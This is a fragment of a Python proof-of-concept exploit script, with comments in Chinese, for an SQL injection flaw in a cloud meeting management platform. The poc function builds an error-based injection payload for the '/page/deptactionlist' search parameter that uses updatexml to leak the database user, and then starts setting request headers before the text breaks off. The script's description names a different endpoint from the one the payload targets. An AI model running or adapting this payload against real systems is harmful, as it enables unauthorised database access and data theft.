...
def main():
    banner()  # 打印欢迎界面
    parser = argparse.ArgumentParser(description="华望云会议管理平台checkDoubleUserNameForAdd存在SQL注入漏洞")
...
def poc(target):
    # 构造payload的url
    payload = "/page/deptactionlist?search=1%25'+and+1%3d(updatexml(0x7e,concat(1,(select+user())),1))+and+'%25%25'+like+'&dpId=1&params[]=dpName&params[]=dpId"
    url = target + payload
    headers = {
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
